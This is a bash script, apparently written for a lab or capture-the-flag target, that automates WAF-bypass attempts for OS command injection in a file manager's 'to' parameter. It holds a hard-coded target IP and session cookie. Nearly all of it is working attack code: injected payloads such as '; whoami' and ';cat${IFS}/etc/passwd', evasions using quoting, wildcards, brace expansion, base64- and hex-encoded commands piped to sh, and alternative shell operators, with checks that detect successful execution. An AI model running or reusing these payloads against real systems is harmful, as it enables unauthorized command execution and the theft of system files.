#!/bin/bash
# WAF Bypass Testing Script for File Manager
# Ghost Ops Security

TARGET="http://94.237.48.12:36396/index.php"
COOKIE="filemanager=fs8famd3a46dnh1adn2sc579dr"
PARAM="to"

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              WAF Bypass Testing - File Manager               ║"
echo "║                    Ghost Ops Security                        ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Function to test a payload
test_payload() {
    local description="$1"
    local payload="$2"
    local encoded=$(printf %s "$payload" | jq -sRr @uri)
    
    echo "[*] Testing: $description"
    echo "    Payload: $payload"
    echo "    Encoded: $encoded"
    
    response=$(curl -s "${TARGET}?${PARAM}=${encoded}&from=51459716.txt&finish=1&move=1" \
        -H "Cookie: $COOKIE" \
        -H "User-Agent: Mozilla/5.0" \
        2>/dev/null)
    
    if echo "$response" | grep -qi "malicious request denied"; then
        echo "    Result: ❌ BLOCKED by WAF"
    elif echo "$response" | grep -qiE "www-data|root:|uid=|gid=|bin/bash"; then
        echo "    Result: ✅ SUCCESS - Command executed!"
        echo "    Evidence found in response"
    else
        echo "    Result: ⚠️  Unknown - Check manually"
    fi
    echo ""
    sleep 1
}

echo "═══════════════════════════════════════════════════════════════"
echo "Phase 1: Basic Command Testing"
echo "═══════════════════════════════════════════════════════════════"
echo ""

test_payload "Simple whoami" "; whoami"
test_payload "Simple id" "; id"
test_payload "Simple pwd" "; pwd"

echo "═══════════════════════════════════════════════════════════════"
echo "Phase 2: Command Obfuscation"
echo "═══════════════════════════════════════════════════════════════"
echo ""

test_payload "Quoted whoami" "; w''hoami"
test_payload "Backslash whoami" "; who\\ami"
test_payload "Full path id" "; /usr/bin/id"
test_payload "Variable expansion" "; \$0 whoami"

echo "═══════════════════════════════════════════════════════════════"
echo "Phase 3: Space Bypass"
echo "═══════════════════════════════════════════════════════════════"
echo ""

test_payload "IFS variable" ";cat\${IFS}/etc/passwd"
test_payload "IFS with command" ";\${IFS}cat\${IFS}/etc/passwd"
test_payload "Tab character" ";cat\t/etc/passwd"
test_payload "Brace expansion" ";{cat,/etc/passwd}"

echo "═══════════════════════════════════════════════════════════════"
echo "Phase 4: Path Obfuscation"
echo "═══════════════════════════════════════════════════════════════"
echo ""

test_payload "Quoted path" "; cat /e''tc/p''asswd"
test_payload "Wildcard path" "; cat /e?c/pas?wd"
test_payload "Variable path" "; cat /\${PATH:0:1}etc/passwd"

echo "═══════════════════════════════════════════════════════════════"
echo "Phase 5: Command Substitution"
echo "═══════════════════════════════════════════════════════════════"
echo ""

test_payload "Dollar paren" "; \$(whoami)"
test_payload "Backticks" "; \`whoami\`"
test_payload "Printf substitution" "; \$(printf whoami)"

echo "═══════════════════════════════════════════════════════════════"
echo "Phase 6: Encoding Bypass"
echo "═══════════════════════════════════════════════════════════════"
echo ""

test_payload "Base64 whoami" "; echo d2hvYW1p | base64 -d | sh"
test_payload "Hex echo" "; echo -e '\x77\x68\x6f\x61\x6d\x69' | sh"

echo "═══════════════════════════════════════════════════════════════"
echo "Phase 7: Alternative Operators"
echo "═══════════════════════════════════════════════════════════════"
echo ""

test_payload "Pipe operator" "| whoami"
test_payload "AND operator" "&& whoami"
test_payload "OR operator" "|| whoami"
test_payload "Newline" "%0a whoami"

echo "═══════════════════════════════════════════════════════════════"
echo "Testing Complete!"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Next Steps:"
echo "1. Review any ✅ SUCCESS results above"
echo "2. Manually verify ⚠️ Unknown results in Burp Suite"
echo "3. Try combining multiple bypass techniques"
echo "4. Test other parameters (from, finish, move)"
echo ""
echo "Ghost Ops Security - Thorough. Professional. Ethical."
